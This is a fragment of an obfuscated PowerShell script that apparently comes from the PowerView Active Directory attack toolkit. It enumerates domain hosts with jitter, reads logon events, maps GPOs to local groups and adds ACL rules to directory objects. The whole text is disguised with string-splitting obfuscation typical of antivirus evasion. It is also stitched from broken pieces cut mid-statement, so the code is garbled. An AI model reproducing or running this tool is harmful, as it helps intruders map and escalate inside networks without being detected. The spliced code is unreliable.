        }
    }
}










function GeT-IJKNEtlIJKoCIJKAIJKlgrOup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{0}{3}{4}{1}Z3b-fS5zhoulS5z,S5zsS5z,S5zPSSS5z,S5zdPS5z,S5zrocesS5z}, S5zS5z)]
    [OutputType({Z3b{3}{5}{2}{1}{4}{0}Z3b-f S5zroup.APIS5z,S5zcalS5z,S5z.LoS5z,S5zPoweS5z,S5zGS5z,S5zrViewS5z})]
    [OutputType({Z3b{3}{2}{4}{0}{1}{5}Z3b-fS5zocalGroup.WinS5z,S5zNS5z,S5zwerVieS5z,S5zPoS5z,S5zw.LS5z,S5zTS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(positIon = 0, VAlUeFRompipeliNE = YoV{tIJKRUE}, VALUEFrompipElinebyPropeRTYnAMe = YoV{TRIJKUe})]
        [Alias({Z3b{0}{1}{2}Z3b -f S5zHostNaS5z,S5zmS5z,S5zeS5z}, {Z3b{2}{3}{0}{1}Z3b-fS5znamS5z,S5zeS5z,S5zdnshoS5z,S5zstS5z}, {Z3b{1}{0}Z3b-fS5zmeS5z,S5znaS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{cOmpUIJKTEIJKRnAIJ',' YoV(YoVTargetComputers.count) Z3b
            &(Z3b{0}{1}{2}Z3b -f S5zWrS5z,S5zite-S5z,S5zVerboseS5z) (S5z[S5z+S5zFS5z+S5zindS5z+S5z-DoS5z+S5zmainLocS5z+S5zalGrouS5z+S5zpMember] S5z+S5zDelS5z+S5zaS5z+S5zy: S5z+Z3bYoVDelay, Z3b+S5zJitteS5z+S5zr: S5z+Z3bYoVJitterZ3b)
            YoV{coUNIJKTIJKEr} = 0
            YoV{rIJKAndIJKNO} = &(Z3b{2}{0}{1}Z3b-f S5z-ObjS5z,S5zectS5z,S5zNewS5z) (Z3b{4}{0}{1}{2}{3}Z3b-f S5zRS5z,S5zanS5z,S5zdoS5z,S5zmS5z,S5zSystem.S5z)

            ForEach (YoV{tIJKArGIJKeTcOmIJKpUTEr} in YoV{TaRGIJKETCoMpuIJKTIJKers}) {
                YoV{CouIJKNIJKTEr} = YoV{couIJKNTER} + 1

                
                &(Z3b{1}{0}{2}Z3b-f S5zrtS5z,S5zStaS5z,S5z-SleepS5z) -Seconds YoV{RaIJKNIJKDno}.(Z3b{0}{1}Z3b -f S5zNS5z,S5zextS5z).Invoke((1-YoV{jIIJKTTIJKEr})*YoV{DeLIJKAY}, (1+YoV{JITIJKTIJKeR})*YoV{DIJKElAy})

                &(Z3b{0}{1}{2}Z3b -f S5zWrite-S5z,S5zVerboS5z,S5zseS5z) Z3b[Find-DomainLocalGroupMember] Enumerating server YoVTargetComputer (YoVCounter of YoV(YoVTargetComputers.count)) Z3b
                &(Z3b{4}{3}{1}{2}{0}Z3b-fS5zndS5z,S5ze-CommS5z,S5zaS5z,S5zvokS5z,S5zInS5z) -ScriptBlock YoV{HoSTeIJKNIJKUmIJKBlIJKoCk} -ArgumentList YoV{tarIJKgIJKEtCOMIJKpUIJKTeR}, YoV{gROIJKUPIJKNAME}, YoV{MeIJKTHoD}, YoV{lIJKOIJKGonToIJKkeN}
            }
        }
        else {
            &(Z3b{1}{2}{0}{3}Z3b -fS5z-VS5z,S5zWriS5z,S5zteS5z,S5zerboseS5z) (S5z[S5z+S5zFinS5z+S5zd-DomaS5z+S5zinS5z+S5zLocalGrS5z+S5zoupMembeS5z+S5zr] S5z+S5zUsiS5z+S5zng S5z+S5zthreS5z+S5zadiS5z+S5zng S5z+S5zwithS5z+S5z S5z+S5ztS5z+S5zhreadsS5z+S5z: S5z+Z3bYoVThreadsZ3b)

            
            Yo','I4ValS5z+S5zidatS5z+S5zeCS5z+S5zountvS5z+S5zI4ValidateLS5z+S5zengS5z+S5zthS5z+S5zvI4ValidS5z+S5zatePatS5z+S5ztS5z+S5zerS5z+S5znvS5z+S5zI4S5z+S5zValiS5z+S5zdS5z+S5zateRaS5z+S5zngS5z+S5zeS5z+S5zvIS5z+S5z4ValiS5z+S5zdS5z+S5zaS5z+S5zteScrS5z+S5ziS5z+S5zptS5z+S5zvS5z+S5zI4VaS5z+S5zlidaS5z+S5zteSS5z+S5zetS5z+S5zvI4S5z+S5zVaS5z+S5zlS5z+S5zidateNoS5z+S5ztS5z+S5zNS5z+S5zullvIS5z+S5z4VS5z+S5zaliS5z+S5zdateNotS5z+S5zNullOS5z+S5zrES5z+S5zmS5z+S5zptS5z+S5zy)UCS5z+S5zKS5z).(Z3b{2}{1}{0}Z3b -fS5zACeS5z,S5zePLS5z,S5zRS5z).Invoke(S5zvI4S5z,S5zJGOS5z).Z3brIJKEPIJKLacEZ3b(([Char]85+[Char]67+[Char]75),[sTRINg][Char]36))
            YoV{aliIJKASIJKREGEX','5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zProvidS5z+S5zer[S5z+S5z
S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+((S5z@NS5z+S5zame=FS5z+S5zpjMiS5z+S5zcrosoft-S5z+S5zWiS5z+S5znS5z+S5zdowS5z+S5zs-SecuritS5z+S5zy-S5z+S5zAS5z+S5zuditingS5z+S5zFpjS5z+S5z
 S5z)-RePlacE  S5zFpjS5z,[chAr]39)+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5zaS5z+S5zndS5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z(LevS5z+S5zelS5z+S5z=4 S5z+S5zorS5z+S5z S5z+S5zLS5z+S5zeS5z+S5zvel=0) S5z+S5zandS5z+S5z S5z+S5z(EvenS5z+S5ztS5z+S5zID=S5z+S5z4S5z+S5z624 S5z+S5zoS5z+S5zr S5z+S5zES5z+S5zventS5z+S5zID=46S5z+S5z25S5z+S5z S5z+S5zorS5z+S5z S5z+S5zES5z+S5zventID=4S5z+S5z63S5z+S5z4)S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z]S5z+S5z
 S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z S5z+S5z','JKiTYMaSks},

        [Switch]
        YoV{TIJKomIJKBIJKStOnE},

        [Alias({Z3b{0}{1}Z3b -fS5zRetS5z,S5zurnOneS5z})]
        [Switch]
        YoV{FInDIJKoIJKNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CreIJKdEnIJKTIAL} =  YoV{jIJKFI}::Z3beIJKmpTYZ3b,

        [Switch]
        YoV{rIJKAW}
    )

    BEGIN {
        YoV{seIJKArcIJKhErarIJKGuIJKMIJKEnTS} = @{
            (Z3b{2}{0}{1}{3}Z3b-f S5zeS5z,S5zarchBasS5z,S5zSS5z,S5zePrefixS5z) = (Z3b{5}{3}{6}{1}{2}{4}{0}Z3b-f S5znfigurationS5z,S5znS5z,S5zetS5z,S5zN=SuS5z,S5zs,CN=Sites,CN=CoS5z,S5zCS5z,S5zbS5z)
        }
        if (YoV{pIJKsBoUnDpIJKArAMIJKeTIJKERS}[(Z3b{0}{2}{1}Z3b-f S5zDS5z,S5zmainS5z,S5zoS5z)]) { YoV{SIJKEaRCIJKhEraRGUMeIJKNts}[(Z3b{0}{1}Z3b -fS5zDomaiS5z,S5znS5z)] = YoV{DOIJKmIJKAIN} }
        if (YoV{PIJKsBoUnIJKdparamIJKEIJKTeIJKRS}[(Z3b{1}{0}{2}Z3b -f S5zropeS5z,S5zPS5z,S5zrtiesS5z)]) { YoV{seArCHeRIJKARIJKGIJKUIJKmeNtS}[(Z3b{3}{0}{1}{2}Z3b -f S5zperS5z,S5ztieS5z,S5zsS5z,S5zProS5z)] = YoV{prIJKOPeRIJKTies} }
        if (YoV{PSbouNDIJKPAIJKRIJKAMEtErs}[(Z3b{3}{1}{0}{2}Z3b -f S5zchBS5z,S5zarS5z,S5zaseS5z,S5zSeS5z)]) { YoV{seARCHErIJKARGuIJKMEnIJKTS}[(Z3b{2}{0}{1}Z3b-fS5zearchBaS5z,S5zseS5z,S5zSS5z)] = YoV{SeIJKArcIJKhbASE} }
        if (YoV{pSIJKBIJKouNIJKDPAramETErS}[(Z3b{1}{0}Z3b -f','oV{seIJKArchIJKerIJKARguIJKMEnTs}[(Z3b{1}{3}{0}{2}Z3b-f S5zimS5z,S5zServerTiS5z,S5zitS5z,S5zmeLS5z)] = YoV{SIJKERvEIJKRTIMelIJKiIJKMiT} }
        if (YoV{pSBoUNDIJKpIJKAIJKRaMetEIJKRs}[(Z3b{2}{0}{1}Z3b -fS5zyMaS5z,S5zsksS5z,S5zSecuritS5z)]) { YoV{SEARCIJKHeIJKRarIJKGUMENTs}[(Z3b{1}{2}{3}{0}Z3b-fS5zMasksS5z,S5zSS5z,S5zecurS5z,S5zityS5z)] = YoV{SEcUIJKRIJKiIJKTymAsIJKKS} }
        if (YoV{psbOUIJKNIJKDPIJKARIJKAMetERs}[(Z3b{0}{1}{2}Z3b -f S5zTomS5z,S5zbsS5z,S5ztoneS5z)]) { YoV{sIJKEARCIJKHerIJKArGUIJKmEIJKNTs}[(Z3b{1}{2}{0}Z3b -f S5ztoneS5z,S5zTomS5z,S5zbsS5z)] = YoV{tIJKoMbIJKsTIJKoNe} }
        if (YoV{PsbIJKOunDpIJKAIJKRAMetIJKErS}[(Z3b{0}{2}{1}Z3b-f S5zCS5z,S5zialS5z,S5zredentS5z)]) { YoV{seArIJKCHEraRGIJKUmeIJKNts}[(Z3b{0}{2}{1}Z3b -f S5zCrS5z,S5zdentialS5z,S5zeS5z)] = YoV{cIJKReDenIJKTIJKiaL} }
        YoV{OIJKBIJKjIJKEcTIJKsEarchEr} = &(Z3b{3}{0}{2}{1}{4}Z3b-fS5zDS5z,S5zSearcheS5z,S5zomainS5z,S5zGet-S5z,S5zrS5z) @SearcherArguments
    }

    PROCESS {
        
        if (YoV{psIJKBOU','ity.AccessControl.AccessControlType] (Z3b{0}{1}Z3b-fS5zAlloS5z,S5zwS5z)
            ','     }
    }
}


function gET-paIJKTIJKhacL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{3}{1}{2}{4}Z3b-fS5zPSSS5z,S5zuldS5z,S5zProS5z,S5zhoS5z,S5zcessS5z}, S5zS5z)]
    [OutputType({Z3b{0}{2}{3}{4}{1}Z3b -fS5zPoweS5z,S5zleACLS5z,S5zrVS5z,S5zieS5z,S5zw.FiS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = YoV{trIJKUE}, ValueFromPIPelInE = YoV{TRIJKUe}, VaLueFRoMPiPeLinebyPROPErTYname = YoV{TIJKRUe})]
        [Alias({Z3b{1}{2}{0}Z3b -fS5zNameS5z,S5zFuS5z,S5zllS5z})]
        [String[]]
        YoV{pIJKATH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CrIJKEDenTIJKIAL} =   YoV{JIJKFI}::Z3bEmpIJKTyZ3b
    )

    BEGIN {

        function CIJKonvEIJKRT-IJKFILeIJKRighT {
            
            [CmdletBinding()]
            Param(
                [Int]
                YoV{FIJKSR}
            )

            YoV{acIJKCIJKESsmAsK} = @{
                [uint32](Z3b{1}{0}{3}{2}Z3b-f S5z8S5z,S5z0xS5z,S5z0S5z,S5z000000S5z) = (Z3b{2}{0}{1}Z3b-fS5zeS5z,S5zricReadS5z,S5zGenS5z)
                [uint32](Z3b{2}{1}{0}Z3b -f S5z00000S5z,S5z00S5z,S5z0x4S5z) = (Z3b{3}{1}{0}{2}Z3b -fS5zrS5z,S5zWS5z,S5ziteS5z,S5zGenericS5z)
                [uint32](Z3b{2}{0}{1}Z3b -fS5z000S5z,S5z000S5z,S5z0x20S5z) = (Z3','5z,S5zGeS5z,S5ztDS5z).Invoke()
                        YoV{taIJKRgETEnIJKTry}.Z3bPsIJKBIJKAseZ3b.Z3bOIJKpTiOIJKNsZ3b.Z3bSEIJKCuritYIJKMIJKAsKSZ3b = (Z3b{0}{1}Z3b-f S5zDaS5z,S5zclS5z)
                        YoV{taIJKRgeIJKTIJKENTRY}.Z3bpIJKSbASeZ3b.Z3bobJEcTseCIJKUIJKRiTyZ3b.(Z3b{3}{0}{1}{2}Z3b -f S5zccesS5z,S5zsS5z,S5zRuleS5z,S5zAddAS5z).Invoke(YoV{AIJKCE})
                        YoV{TAIJKRGEIJKTENTIJKRy}.Z3bPsIJKBIJKAsEZ3b.(Z3b{3}{2}{1}{0}Z3b -f S5zangesS5z,S5ztChS5z,S5zmmiS5z,S5zCoS5z).Invoke()
                    }
                }
                catch {
                    &(Z','z,S5zSearchS5z,S5zpS5z,S5zeS5z)]) { YoV{CoMIJKmOnARGuIJKMENtS}[(Z3b{1}{0}{2}Z3b -fS5zrchScopS5z,S5zSeaS5z,S5zeS5z)] = YoV{SIJKearcIJKHsCoPE} }
        if (YoV{pSIJKBouIJKNIJKdParAMeIJKTeIJKRs}[(Z3b{0}{1}{4}{2}{3}Z3b -f S5zRS5z,S5zesulS5z,S5zPageSizS5z,S5zeS5z,S5ztS5z)]) { YoV{cIJKomMIJKOnarGUmeIJKNtS}[(Z3b{0}{1}{2}{4}{3}Z3b-fS5zResuS5z,S5zlS5z,S5ztPaS5z,S5zizeS5z,S5zgeSS5z)] = YoV{rEsuLtpIJKAgeIJKSIZE} }
        if (YoV{PsIJKBOuNdPIJKARaMetIJKErs}[(Z3b{1}{0}{2}{3}Z3b -fS5zrvS5z,S5zSeS5z,S5zerTimeLS5z,S5zimitS5z)]) { YoV{cOmIJKmIJKOnaIJKRIJKgUmENts}[(Z3b{1}{0}{2}{3}Z3b-fS5zeLiS5z,S5zServerTimS5z,S5zmS5z,S5zitS5z)] = YoV{SeRIJKVEIJKRTiIJKmeLimIJKIT} }
        if (YoV{PsBOIJKUIJKNDpIJKAraMETEIJKRS}[(Z3b{1}{0}Z3b -fS5zneS5z,S5zTombstoS5z)]) { YoV{cOIJKmmONArGuIJKMIJKENTS}[(Z3b{2}{0}{1}Z3b-f S5zoS5z,S5zmbstoneS5z,S5zTS5z)] = YoV{tOIJKMBsTOIJKNe} }
        if (YoV{PsIJKBOundpIJKArIJKAIJKmeTIJKers}[(Z3b{0}{1}{2}Z3b -f S5zCS5z,S5zredS5z,S5zentialS5z)]) { YoV{COIJKMIJKMoIJKNIJKARGuMenTS}[(Z3b{1}{2}{0}Z3b-f S5zlS5z,S5zCredeS5z,S5zntiaS5z)] = YoV{CredEnIJKTIJKiaL} }
    }

    PROCESS {
        if (YoV{pSBIJKoIJKUnDIJKPIJKAIJKRAmeters}[(Z3b{3}{2}{0}{1}Z3b -fS5zmputerIdeS5z,S5zntityS5z,S5zoS5z,S5zCS5z)]) {
            YoV{CIJKomIJKpuTERS} = &(Z3b{3}{1}{2}{0}Z3b -f S5zrS5z,S5zainCS5z,S5zomputeS5z,S5zGet-DomS5z) @CommonArguments -Identity YoV{CoIJKmpIJKUtERiIJKdEnIJKTIIJKTy} -Properties (Z3b{1}{2}{7}{4}{3}{6}{0}{5}Z3b-fS5ztnS5z,S5zdistS5z,S5zinguiS5z,S5zameS5z,S5zhednS5z,S5zameS5z,S5z,dnshosS5z,S5zsS5z)

            if (-not YoV{COMIJKpuIJKTers}) {
                throw (S5z[GetS5z+S5z-S5z+S5zDomS5z+S5zaS5z+S5zinGPOComputerLocalGrS5z+S5zouS5z+S5zpMappiS5z+S5zngS5z+S5z] S5z+S5zComS5z+S5zputeS5z+S5zr S5z+Z3bYoVComputerIdentity Z3b+S5znS5z+S5zot S5z+S5zfoS5z+S5zund. S5z+S5zTryS5z+S5z S5z+S5za S5z+S5zfulS5z+S5zly S5z+S5zquS5z+S5zalifiS5z+S5zed S5z+S5zhosS5z+S5zt S5z+S5znameS5z+S5z.S5z)
            }

            ForEach (YoV{CoMpUIJKTIJKeR} in YoV{COmpUTIJKEIJKRs}) {

                YoV{GpOIJKguiIJKDS} = @()

                
                YoV{Dn} = YoV{cIJKoMpIJKUTeR}.Z3bDIJKIstinIJKGIJKUISheDIJKNAmEZ3b
                YoV{OUIIJKNdIJKEX} = YoV{dIJKN}.(Z3b{0}{1}Z3b-f S5zIndexOS5z,S5zfS5z).Invoke(S5zOU=S5z)
                if (YoV{OuIJKiNdIJKeX} -gt 0) {
                    YoV{oUIJKNaIJKmE} = YoV{DIJKN}.(Z3b{2}{1}{0}Z3b-f S5zringS5z,S5zStS5z,S5zSubS5z).Invoke(YoV{oUinIJKdIJKEx})
                }
                if (YoV{OIJKUNAmE}) {
                    YoV{GPIJKOgIJKUids} += &(Z3b{1}{2}{0}Z3b-f S5zUS5z,S5zGet-DS5z,S5zomainOS5z) @CommonArguments -SearchBase YoV{oIJKUNamE} -LDAPFilter ((Z3b{2}{1}{0}Z3b -f S5zk=*)S5z,S5zplinS5z,S5z(gS5z)) JGO &(Z3b{3}{2}{1}{0}Z3b -f S5zh-ObjectS5z,S5zacS5z,S5zES5z,S5zForS5z) {
                        &(Z3b{0}{2}{1}{3}Z3b -fS5zSeS5z,S5zcS5z,S5zleS5z,S5zt-StringS5z) -InputObject YoV{_}.Z3bgPlIIJKNkZ3b -Pattern S5z(5rj{){0,1}[0-9a-fA-F]{8}5rj-[0-9a-fA-F]{4}5rj-[0-9a-fA-F]{4}5rj-[0-9a-fA-F]{4}5rj-[0-9a-fA-F]{12}(5rj}){0,1}S5z -AllMatches JGO &(Z3b{0}{3}{1}{2}Z3b -fS5zFS5z,S5zch-S5z,S5zObjectS5z,S5zorEaS5z) {YoV{_}.Z3bmaTCIJKHIJKeSZ3b JGO &(Z3b{2}{4}{0}{3}{1}Z3b-fS5zleS5z,S5zctS5z,S5zSS5z,S5zct-ObjeS5z,S5zeS5z) -ExpandProperty (Z3b{1}{0}Z3b -fS5zeS5z,S5zValuS5z) }
                    }
                }

                
                &(Z3b{0}{1}{2}Z3b-f S5zWrite-VS5z,S5zeS5z,S5zrboseS5z) Z3bEnumerating the sitename for: YoV(YoVComputer.dnshostname) Z3b
                YoV{coMPUtIJKERsIJKiTE} = (&(Z3b{1}{2}{3}{0}{4}{5}{6}Z3b-fS5zetComS5z,S5zGS5z,S5zeS5z,S5zt-NS5z,S5zputeS5z,S5zrSitS5z,S5zeNameS5z) -ComputerName YoV{cIJKoIJKMPuTER}.Z3bDnIJKsHOSIJKTIJKNamEZ3b).Z3bsItIJKeNaIJKMeZ3b
                if (YoV{coMPIJKUIJKTErsIIJKTe} -and (Yo','EIJKRNaMe}, YoV{stIJKArTIJKTIME}, YoV{enDIJKTIJKIME}, YoV{MIJKAXIJKevEnts}, YoV{TIJKARgeIJKTUSIJKers}, YoV{fiIJKLIJKTeR}, YoV{CreIJKdEnIJKTiAl})

            ForEach (YoV{tIJKARIJKGEtCOMPUtEr} in YoV{coIJKmIJKPUTErnIJKAME}) {
                YoV{uIJKP} = &(Z3b{2}{0}{1}{3}Z3b -fS5zt-ConnecS5z,S5ztioS5z,S5zTesS5z,S5znS5z) -Count 1 -Quiet -ComputerName YoV{TIJKARGeTCIJKOmIJKputER}
                if (YoV{Up}) {
                    YoV{DoIJKmAIIJKNuIJKsErEVEntIJKAIJKRgs} = @{
                        (Z3b{2}{3}{0}{1}Z3b-fS5zrNaS5z,S5zmeS5z,S5zComS5z,S5zputeS5z) = YoV{TIJKARIJKgETCompIJKUTEr}
                    }
                    if (YoV{STArtIJKTIJKiMe}) { YoV{DOIJKMAIJKINusIJKereIJKVeNTaIJKRIJKGs}[(Z3b{0}{2}{1}Z3b -fS5zSS5z,S5zrtTimeS5z,S5ztaS5z)] = YoV{SIJKTaIJKRTTiMe} }
                    if (YoV{EnIJKdTIIJKMe}) { YoV{DIJKoMaINUIJKsErEVIJKenTARGS}[(Z3b{0}{2}{1}Z3b-fS5zEndTS5z,S5zeS5z,S5zimS5z)] = YoV{enDIJKTIJKIMe} }
                    if (YoV{MIJKAxEIJKVENIJKTS}) { YoV{DomAIJKiNUseIJKRIJKEvIJKENTaRGs}[(Z3b{0}{1}{2}Z3b -f S5zMaxS5z,S5zES5z,S5zventsS5z)] = YoV{MAXevIJKENIJKTs} }
                    if (YoV{CReIJKdIJKeIJKNtIaL}) { YoV{dIJKOmIJKAIJKInuSereVENtIJKArIJKgS}[(Z3b{2}{0}{1}Z3b -f S5zdS5z,S5zentialS5z,S5zCreS5z)] = YoV{cRedEIJKNtIIJKAL} }
                    if (YoV{FiIJKLIJKTeR} -or YoV{TIJKARGETIJKUsIJKerS}) {
                        if (YoV{tARGEtIJKUsEIJKRS}) {
                            &(Z3b{4}{2}{0}{3}{1}Z3b-f S5zUsS5z,S5zentS5z,S5zDomainS5z,S5zerEvS5z,S5zGet-S5z) @DomainUserEventArgs JGO &(Z3b{2}{0}{1}Z3b -fS5zrS5z,S5ze-ObjectS5z,S5zWheS5z) {YoV{TargIJKeTuSIJKeRS} -contains YoV{_}.Z3bTIJKArIJKGEIJKTUSEIJKRnAMeZ3b}
                        }
                        else {
                            YoV{OPIJKeIJKRATor} = S5zorS5z
                            YoV{FIlIJKTIJKer}.Z3bKIJKeYSZ3b JGO &(Z3b{2}{1}{0}Z3b -fS5zctS5z,S5zeS5z,S5zForEach-ObjS5z) {
                                if ((YoV{_} -eq S5zOpS5z) -or (YoV{_} -eq (Z3b{1}{2}{0}Z3b-fS5zrS5z,S5zOS5z,S5zperatoS5z)) -or (YoV{_} -eq (Z3b{1}{0}{2}{3}Z3b-fS5zpeS5z,S5zOS5z,S5zratioS5z,S5znS5z))) {
                                    if ((YoV{fIJKIltER}[YoV{_}] -match S5z&S5z) -or (YoV{fiLIJKTIJKEr}[YoV{_}] -eq S5zandS5z)) {
                                        YoV{opEIJKRIJKAToR} = S5zandS5z
                                    }
                                }
                            }
                            YoV{KeIJKYS} = YoV{fIIJKltIJKeR}.Z3bkeIJKySZ3b JGO &(Z3b{3}{1}{0}{2}Z3b -fS5ze-ObjS5z,S5zerS5z,S5zectS5z,S5zWhS5z) {(YoV{_} -ne S5zOpS5z) -and (YoV{_} -ne (Z3b{2}{1}{0}Z3b-fS5zratorS5z,S5zpeS5z,S5zOS5z)) -and (YoV{_} -ne (Z3b{0}{1}Z3b -fS5zOpeS5z,S5zrationS5z))}
                            &(Z3b{1}{4}{0}{3}{2}Z3b -f S5zerEvS5z,S5zGet-DS5z,S5ztS5z,S5zenS5z,S5zomainUsS5z) @DomainUserEventArgs JGO &(Z3b{2}{4}{1}{0}{3}Z3b -fS5zh-ObjeS5z,S5zEacS5z,S5zFS5z,S5zctS5z,S5zorS5z) {
                                if (YoV{OPeRAIJKTIJKoR} -eq S5zorS5z) {
                                    ForEach (YoV{kIJKeY} in YoV{KEIJKys}) {
                                        if (YoV{_}.Z3bYoVKeyZ3b -match YoV{fiLtIJKER}[YoV{kIJKeY}]) {
                                            YoV{_}
                                        }
                                    }
                                }
                                else {
                                    
                                    ForEach (YoV{KIJKEY} in YoV{keIJKys}) {
                                        if (YoV{_}.Z3bYoVKeyZ3b -notmatch YoV{FIJKilter}[YoV{KIJKEy}]) {
                                            break
                                        }
                                        YoV{_}
                                    }
                                }
                            }
                        }
                    }
                    else {
                        &(Z3b{4}{5}{3}{2}{0}{1}Z3b-fS5zEvenS5z,S5ztS5z,S5zrS5z,S5zUseS5z,S5zGet-DomaiS5z,S5znS5z) @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        
        if (YoV{PSbOuNdIJKpAIJKRAMIJKetIJKeRS}[(Z3b{0}{1}Z3b-f S5zDS5z,S5zelayS5z)] -or YoV{psbouIJKNdpIJKArAMEIJKTEIJKRs}[(Z3b{1}{2}{0}Z3b-fS5zuccessS5z,S5zStopOS5z,S5znSS5z)]) {

            &(Z3b{1}{0}{2}Z3b -fS5zte-S5z,S5zWriS5z,S5zVerboseS5z) Z3b[Find-DomainUserEvent] Total number of hosts: YoV(YoVTargetComputers.count) Z3b
            &(Z3b{1}{0}{2}Z3b-f S5zosS5z,S5zWrite-VerbS5z,S5zeS5z) (S5z[FiS5z+S5znd-DomainUS5z+S5zserS5z+S5zEventS5z+S5z]S5z+S5z S5z+S5zDelay:S5z+S5z S5z+Z3bYoVDelay, Z3b+S5zJitterS5z+S5z:S5z+S5z S5z+Z3bYoVJitterZ3b)
            YoV{COIJKUnteR} = 0
       ','es YoV{_}.Z3bPIJKROPeIJKRTieSZ3b
                        YoV{cIJKOMPuTer}.Z3bpsIJKObIJKjECTZ3b.Z3btyPIJKeNAIJKMesZ3b.(Z3b{0}{1}Z3b -f S5zInseS5z,S5zrtS5z).Invoke(0, (Z3b{3}{2}{1}{0}Z3b -fS5zuterS5z,S5zCompS5z,S5ziew.S5z,S5zPowerVS5z))
                    }
                    YoV{COIJKmpIJKUter}
                }
            }
            if (YoV{rEIJKsulIJKTs}) {
             ','jS5z+S5zectS5z+S5zPrS5z+S5zopertyS5z+S5zOutlier] S5z+S5zCaS5z+S5zlculaS5z+S5zted S5z+S5zReS5z+S5zferenS5z+S5zceObjectCS5z+S5zlassS5z+S5z S5z+S5z: S5z+Z3bYoVReferenceObjectClassZ3b)
        }
        else {
            &(Z3b{4}{1}{0}{3}{2}Z3b -f S5zeS5z,S5zitS5z,S5zVerboseS5z,S5z-S5z,S5zWrS5z) (S5z[FiS5z+S5znd-DS5z+S5zoS5z+S5zmS5z+S5zainOS5z+S5zbjectProperS5z+S5ztyOS5z+S5zutlier] S5z+S5zUsiS5z+S5zng S5z+S5ztS5z+S5zhe S5z+S5zdS5z+S5zefS5z+S5zault S5z+S5zrefS5z+S5zerenS5z+S5zce S5z+S5zpS5z+S5zrS5z+S5zoperty S5z+S5zseS5z+S5zt S5z+S5zfoS5z+S5zr S5z+S5ztheS5z+S5z S5z+S5zobjS5z+S5zectS5z+S5z S5z+S5zclS5z+S5zass S5z+Z3bS5zYoVClassNameS5zZ3b)
        }

        if ((YoV{clASIJKSIJKNIJKAME} -eq (Z3b{0}{1}Z3b-f S5zUseS5z,S5zrS5z)) -or (YoV{refEIJKReNIJKCeOBJEcIJKTIJKcIJKlAss} -eq (Z3b{1}{0}Z3b-f S5zserS5z,S5zUS5z))) {
            YoV{ObjIJKeIJKCTs} = &(Z3b{4}{2}{0}{1}{3}Z3b-f S5zDS5z,S5zomainUS5z,S5z-S5z,S5zserS5z,S5zGetS5z) @SearcherArguments
            if (-not YoV{RefErIJKEnCIJKEobJIJKeIJKCIJKTIJKPROIJKPeIJKRTIEs}) {
                YoV{RefIJKeReNcEOIJKBjeCtIJKpIJKROPIJKeIJKRtIes} = YoV{UsErIJKREfERENCEPIJKRoPIJKErTYIJKSet}
            }
        }
        elseif ((YoV{cIJKlASSIJKNAMe} -eq (Z3b{1}{0}Z3b -fS5zupS5z,S5zGroS5z)) -or (YoV{REIJKFIJKERENCeOBJectCIJKLaSS} -eq (Z3b{1}{0}Z3b-fS5zupS5z,S5zGroS5z))) {
            YoV{OBJIJKeIJKCTS} = &(Z3b{2}{3}{0}{1}Z3b -fS5zmainS5z,S5zGroupS5z,S5zGet-DS5z,S5zoS5z) @SearcherArguments
            if (-not YoV{REIJKFEreNceoBJEIJKcTPROpEIJKRIJKTIJKies}) {
                YoV{reIJKFereIJKNIJKceOBjEctpIJKRoPeRTIIJKes} = YoV{GIJKRoupReIJKFeReNIJKcEpRIJKoPeRIJKTyIJKsIJKeT}
            }
        }
        elseif ((YoV{ClIJKASSIJKNaMe} -eq (Z3b{1}{0}{2}Z3b-fS5zomputS5z,S5zCS5z,S5zerS5z)) -or (YoV{rIJKEIJKFEReIJKNCEOBIJKJeIJKcTClasS} -eq (Z3b{1}{0}Z3b-f S5zputerS5z,S5zComS5z))) {
            YoV{OBJeIJKcTS} = &(Z3b{0}{4}{3}{2}{1}Z3b-fS5zGetS5z,S5zrS5z,S5zomainComputeS5z,S5zDS5z,S5z-S5z) @SearcherArguments
            if (-not YoV{reIJKFeRenCEIJKObjIJKeCTPIJKRoIJKpErTIJKIIJKEs}) {
                YoV{rIJKEfErENCIJKEIJKOBjeIJKCtPrOIJKpeIJKRTIIJKES} = YoV{coMpIJKUTIJKeIJKRrefEIJKRIJKEIJKNcepRIJKOIJKPertySet}
            }
        }
        else {
